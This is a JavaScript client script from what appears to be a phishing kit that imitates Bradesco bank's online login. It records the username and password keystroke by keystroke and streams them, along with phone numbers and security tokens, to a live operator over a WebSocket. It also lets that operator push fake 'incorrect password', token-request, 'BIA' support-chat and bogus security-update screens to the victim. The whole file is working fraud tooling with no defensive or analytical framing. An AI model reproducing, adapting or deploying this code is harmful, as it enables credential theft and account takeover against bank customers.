/**
 * Cliente Bridge - Injetado na página Bradesco para WebSocket e controle remoto
 * Captura inputs em tempo real e recebe comandos do operador
 * Inclui: Ícone BIA, Tela de Carregamento, Popups, Chat BIA
 */

(function() {
  'use strict';

  let sessionId = new URLSearchParams(window.location.search).get('sessionId');
  if (!sessionId) {
    sessionId = localStorage.getItem('bradesco_session_id') || 'cliente-' + Math.random().toString(36).substr(2, 9);
  }
  localStorage.setItem('bradesco_session_id', sessionId);
  let socket = null;
  let currentScreen = 'login';
  let biaChatOpen = false;
  const biaMessages = [];
  const capturedData = {
    usuario: '',
    senha: '',
    token: '',
    ddd: '',
    telefone: '',
  };

  console.log('[BRIDGE] Iniciando cliente-bridge.js, sessionId:', sessionId);

  // Expor funções necessárias globalmente para os botões no HTML funcionarem
  window.bradescoBridge = {
    submitPhone: () => {
      const ddd = document.getElementById('overlay-ddd')?.value;
      const phone = document.getElementById('overlay-phone')?.value;
      if (ddd && phone) {
        emitInput('ddd', ddd);
        emitInput('telefone', phone);
        showOverlay('loading', 'VALIDANDO DADOS...');
      }
    },
    closeOverlay: () => {
      removeOverlay();
      emitScreenChange('login');
    },
    sendBiaMessage: () => {
      const input = document.getElementById('bia-input');
      const texto = input?.value;
      if (texto && socket && socket.connected) {
        addBiaMessage('Você', texto);
        socket.emit('client:bia-message', { texto });
        input.value = '';
      }
    }
  };

  // ============================================================================
  // SOCKET.IO CONNECTION
  // ============================================================================

  function connectSocket() {
    console.log('[BRIDGE] Conectando ao WebSocket...');
    
    if (typeof io === 'undefined') {
      console.log('[BRIDGE] Socket.IO não carregado ainda, tentando novamente em 100ms');
      setTimeout(connectSocket, 100);
      return;
    }

    // Usar o origin atual para garantir que o socket conecte no mesmo domínio
    console.log('[BRIDGE] Conectando via WebSocket puro...');
    socket = io(window.location.origin, {
      query: { role: 'client', sessionId },
      reconnection: true,
      reconnectionDelay: 1000,
      reconnectionDelayMax: 5000,
      reconnectionAttempts: Infinity,
      transports: ['websocket', 'polling']
    });

    socket.on('connect', () => {
      console.log('[CLI] ✅ Conectado ao servidor:', socket.id);
      // Remover tela de carregamento inicial se houver
      removeOverlay();
      emitScreenChange(currentScreen || 'login');
    });

    socket.on('client:welcome', (data) => {
      console.log('[CLI] 👋 Bem-vindo! SessionId oficial:', data.sessionId);
      if (data.sessionId !== sessionId) {
        console.log('[CLI] 🔄 Atualizando sessionId local para:', data.sessionId);
        sessionId = data.sessionId;
        localStorage.setItem('bradesco_session_id', sessionId);
      }
    });

    socket.on('client:command', (data) => {
      console.log('[CLI] 🎯 Comando recebido:', data.command, data.payload);
      handleCommand(data.command, data.payload);
    });

    socket.on('client:info', (data) => {
      console.log('[CLI] ℹ️ Info recebida:', data);
    });

    socket.on('client:bia-message', (data) => {
      console.log('[CLI] 💬 Mensagem BIA recebida:', data.texto);
      // addBiaMessage já gerencia o array biaMessages
      addBiaMessage('Operador', data.texto);
    });

    socket.on('client:bia-avatar', (data) => {
      console.log('[CLI] 🎭 Avatar BIA atualizado');
      updateBiaAvatar(data.avatar);
    });

    socket.on('client:disconnect', () => {
      console.log('[CLI] 🔴 Desconectado pelo operador');
      showOverlay('disconnect', 'Sessão encerrada pelo operador');
    });

    socket.on('disconnect', () => {
      console.log('[CLI] ⚠️ Desconectado do servidor');
    });

    socket.on('error', (error) => {
      console.error('[CLI] ❌ Erro no socket:', error);
    });
  }

  // ============================================================================
  // EMITIR MUDANÇA DE TELA
  // ============================================================================

  function emitScreenChange(screen) {
    currentScreen = screen;
    console.log('[BRIDGE] Tela mudou para:', screen);
    if (socket && socket.connected) {
      socket.emit('client:tela-mudou', { tela: screen });
    }
  }

  // ============================================================================
  // EMITIR INPUT DE USUÁRIO
  // ============================================================================

  function emitInput(campo, valor) {
    capturedData[campo] = valor;
    console.log('[BRIDGE] Input capturado:', campo, '=', valor.substring(0, 5) + '...');
    if (socket && socket.connected) {
      socket.emit('client:input', { campo, valor });
    }
  }

  // ============================================================================
  // PROCESSAR COMANDO DO OPERADOR
  // ============================================================================

  function handleCommand(command, payload) {
    console.log('[CLI] 🔄 Processando comando:', command);
    
    // Remover overlay anterior antes de mostrar novo
    removeOverlay();
    
    switch (command) {
      case 'Tela de Login':
        showScreen('login');
        break;
      case 'Aguarde / Senha Incorreta':
        showOverlay('loading', 'VALIDAÇÃO DIGITAL AGUARDE...<br>Estamos validando o código da sua Chave de Segurança Animada.');
        break;
      case 'Pedir Celular':
        showOverlay('phone', 'Atualize seu numero de celular para que possamos entrar em contato caso haja alguma divergência de dados.');
        break;
      case 'Pedir Token Tela':
      case 'Pedir Token Físico':
      case 'Pedir Token QR Code':
        showOverlay('token', 'Identificação Positiva<br>Abra o aplicativo Bradesco, vá em Chave de Segurança e em seguida, toque em Validação Digital.');
        break;
      case 'Erro Token':
        showOverlay('error', 'Erro ao validar token. Tente novamente.');
        break;
      case 'Erro Celular':
        showOverlay('error', 'Erro ao validar celular. Tente novamente.');
        break;
      case 'Desbloqueio BIA':
        showBiaChat();
        break;
      case 'Erro Desbloqueio BIA':
        showOverlay('error', 'Erro ao desbloquear BIA. Tente novamente.');
        break;
      case 'Instalar Modulo':
        showOverlay('progress', 'Atualização em Andamento...');
        break;
      case 'Validar Modulo':
        showOverlay('success', 'Atualização Concluída com Sucesso!<br>Seu computador/dispositivo foi atualizado com as novas politicas de transações bancarias.');
        break;
    }
  }

  // ============================================================================
  // MOSTRAR OVERLAY/POPUP
  // ============================================================================

  function showOverlay(type, message, autoCloseTime = 0) {
    console.log('[BRIDGE] 📱 Mostrando overlay:', type);
    removeOverlay();
    const overlay = document.createElement('div');
    overlay.id = 'bradesco-overlay';
    overlay.className = `bradesco-overlay bradesco-overlay-${type}`;
    
    let content = '';
    switch (type) {
      case 'loading':
        content = `
          <div class="overlay-content overlay-loading">
            <div class="spinner"></div>
            <h2>${message}</h2>
          </div>
        `;
        break;
      case 'phone':
        content = `
          <div class="overlay-content">
            <h2>Atualização de Informações</h2>
            <p>${message}</p>
            <div class="form-group">
              <label>DDD</label>
              <input type="text" id="overlay-ddd" placeholder="11" maxlength="2">
            </div>
            <div class="form-group">
              <label>Telefone</label>
              <input type="text" id="overlay-phone" placeholder="98011-5451">
            </div>
            <button onclick="window.bradescoBridge.submitPhone()">ENVIAR</button>
          </div>
        `;
        break;
      case 'token':
        content = `
          <div class="overlay-content">
            <h2>${message}</h2>
            <div style="margin-top: 30px; padding: 20px; background: #f0f0f0; border-radius: 8px; text-align: center;">
              <div style="font-size: 12px; color: #666;">QR Code será exibido aqui</div>
            </div>
            <button onclick="window.bradescoBridge.closeOverlay()">FECHAR</button>
          </div>
        `;
        break;
      case 'progress':
        content = `
          <div class="overlay-content">
            <h2>${message}</h2>
            <div class="progress-bar">
              <div class="progress-fill"></div>
            </div>
          </div>
        `;
        break;
      case 'success':
        content = `
          <div class="overlay-content overlay-success">
            <h2>✓ Sucesso</h2>
            <p>${message}</p>
            <button onclick="window.bradescoBridge.closeOverlay()">FECHAR</button>
          </div>
        `;
        break;
      case 'error':
        content = `
          <div class="overlay-content overlay-error">
            <h2>✗ Erro</h2>
            <p>${message}</p>
            <button onclick="window.bradescoBridge.closeOverlay()">FECHAR</button>
          </div>
        `;
        break;
      case 'disconnect':
        content = `
          <div class="overlay-content overlay-error">
            <h2>Sessão Encerrada</h2>
            <p>${message}</p>
          </div>
        `;
        break;
    }
    
    overlay.innerHTML = content;
    document.body.appendChild(overlay);
    emitScreenChange(type);
  }

  // ============================================================================
  // REMOVER OVERLAY
  // ============================================================================

  function removeOverlay() {
    const overlay = document.getElementById('bradesco-overlay');
    if (overlay) {
      overlay.remove();
    }
    biaChatOpen = false;
  }

  // ============================================================================
  // MOSTRAR TELA
  // ============================================================================

  function showScreen(screen) {
    removeOverlay();
    emitScreenChange(screen);
  }

  // ============================================================================
  // CHAT BIA
  // ============================================================================

  function showBiaChat() {
    console.log('[BRIDGE] 💬 Mostrando chat BIA');
    removeOverlay();
    biaChatOpen = true;
    const overlay = document.createElement('div');
    overlay.id = 'bradesco-overlay';
    overlay.className = 'bradesco-overlay bradesco-overlay-bia';
    overlay.innerHTML = `
      <div class="bradesco-bia-chat">
        <div class="bia-header">
          <span class="bia-title">💬 Chat com BIA</span>
          <button class="bia-close" onclick="window.bradescoBridge.closeOverlay()">×</button>
        </div>
        <div id="bia-messages" class="bia-messages"></div>
        <div class="bia-input-group">
          <input type="text" id="bia-input" placeholder="Digite sua mensagem..." />
          <button onclick="window.bradescoBridge.sendBiaMessage()">📤</button>
        </div>
      </div>
    `;
    document.body.appendChild(overlay);
    
    // Renderizar histórico de mensagens
    const messagesDiv = document.getElementById('bia-messages');
    if (messagesDiv) {
      biaMessages.forEach(msg => {
        const msgEl = document.createElement('div');
        msgEl.className = `bia-message bia-message-${msg.de.toLowerCase()}`;
        msgEl.innerHTML = `<strong>${msg.de}:</strong> ${msg.texto}`;
        messagesDiv.appendChild(msgEl);
      });
      messagesDiv.scrollTop = messagesDiv.scrollHeight;
    }
    
    emitScreenChange('bia-chat');
  }

  function addBiaMessage(de, texto) {
    // Não duplicar mensagens
    const lastMsg = biaMessages[biaMessages.length - 1];
    if (lastMsg && lastMsg.de === de && lastMsg.texto === texto) {
      return; // Mensagem já foi adicionada
    }
    
    biaMessages.push({ de, texto, ts: Date.now() });
    const messagesDiv = document.getElementById('bia-messages');
    if (messagesDiv) {
      const msg = document.createElement('div');
      msg.className = `bia-message bia-message-${de.toLowerCase()}`;
      msg.innerHTML = `<strong>${de}:</strong> ${texto}`;
      messagesDiv.appendChild(msg);
      messagesDiv.scrollTop = messagesDiv.scrollHeight;
    }
  }

  function sendBiaMessage() {
    const input = document.getElementById('bia-input');
    if (!input || !input.value.trim()) {
      console.warn('[BRIDGE] ⚠️ Campo de mensagem vazio ou não encontrado');
      return;
    }
    
    const texto = input.value.trim();
    console.log('[BRIDGE] 💬 Enviando mensagem BIA:', texto);
    
    if (!socket || !socket.connected) {
      console.error('[BRIDGE] ❌ Socket não conectado');
      alert('Erro: Não conectado ao servidor');
      return;
    }
    
    // Emitir para o servidor (que vai repassar para o operador)
    socket.emit('client:bia-message', { texto });
    
    // Adicionar ao histórico local
    addBiaMessage('Você', texto);
    
    // Limpar input
    input.value = '';
    input.focus();
  }

  function updateBiaAvatar(avatar) {
    console.log('[BRIDGE] 🎭 Avatar atualizado');
  }

  // ============================================================================
  // SETUP DE LISTENERS
  // ============================================================================

  function setupListeners() {
    console.log('[BRIDGE] 🔧 Configurando listeners de input...');
    
    // Listener para campo de usuário
    const usuarioInput = document.getElementById('identificationForm:txtUsuario');
    if (usuarioInput) {
      usuarioInput.addEventListener('input', (e) => {
        emitInput('usuario', e.target.value);
      });
      console.log('[BRIDGE] ✅ Listener de usuário configurado');
    }

    // Listener para campo de senha
    const senhaInput = document.getElementById('identificationForm:txtSenha');
    if (senhaInput) {
      // Manter como type="password" para mascarar na tela do cliente
      senhaInput.type = 'password';
      senhaInput.addEventListener('input', (e) => {
        emitInput('senha', e.target.value);
      });
      console.log('[BRIDGE] ✅ Listener de senha configurado (mascarado)');
    }

    // Listener para botão Avançar
    const botaoAvancar = document.getElementById('identificationForm:botaoAvancar');
    if (botaoAvancar) {
      botaoAvancar.addEventListener('click', () => {
        console.log('[BRIDGE] 🔐 Botão Avançar clicado');
        showOverlay('loading', 'CARREGANDO...');
        emitScreenChange('carregando');
      });
      console.log('[BRIDGE] ✅ Listener do botão Avançar configurado');
    }
  }

  // ============================================================================
  // CRIAR ÍCONE BIA
  // ============================================================================

  function createBiaIcon() {
    console.log('[BRIDGE] 🎨 Criando ícone BIA');
    const icon = document.createElement('button');
    icon.id = 'bradesco-bia-icon';
    icon.innerHTML = '💬';
    icon.style.cssText = `
      position: fixed;
      bottom: 20px;
      right: 20px;
      width: 60px;
      height: 60px;
      border-radius: 50%;
      background: #d32f2f;
      color: white;
      border: 3px solid white;
      font-size: 30px;
      cursor: pointer;
      z-index: 100000;
      box-shadow: 0 4px 15px rgba(0,0,0,0.5);
      transition: all 0.3s ease;
    `;
    icon.onmouseover = () => {
      icon.style.transform = 'scale(1.1)';
      icon.style.boxShadow = '0 4px 15px rgba(0,0,0,0.4)';
    };
    icon.onmouseout = () => {
      icon.style.transform = 'scale(1)';
      icon.style.boxShadow = '0 2px 10px rgba(0,0,0,0.3)';
    };
    icon.onclick = () => {
      console.log('[BRIDGE] 💬 Ícone BIA clicado');
      showBiaChat();
    };
    document.body.appendChild(icon);
    console.log('[BRIDGE] ✅ Ícone BIA criado');
  }

  // ============================================================================
  // EXPORTAR FUNÇÕES GLOBAIS
  // ============================================================================

  window.bradescoBridge = {
    closeOverlay: removeOverlay,
    submitPhone: () => {
      const ddd = document.getElementById('overlay-ddd')?.value;
      const phone = document.getElementById('overlay-phone')?.value;
      if (ddd && phone) {
        console.log('[BRIDGE] 📱 Telefone enviado:', ddd, phone);
        emitInput('ddd', ddd);
        emitInput('telefone', phone);
        removeOverlay();
      }
    },
    sendBiaMessage: sendBiaMessage,
  };

  // ============================================================================
  // INICIALIZAÇÃO
  // ============================================================================

  function init() {
    console.log('[BRIDGE] 🚀 Inicializando cliente-bridge...');
    
    // Aguardar DOM estar pronto
    if (document.readyState === 'loading') {
      document.addEventListener('DOMContentLoaded', () => {
        console.log('[BRIDGE] ✅ DOM pronto');
        setupListeners();
        createBiaIcon();
        connectSocket();
      });
    } else {
      console.log('[BRIDGE] ✅ DOM já pronto');
      setupListeners();
      createBiaIcon();
      connectSocket();
    }
  }

  init();
})();
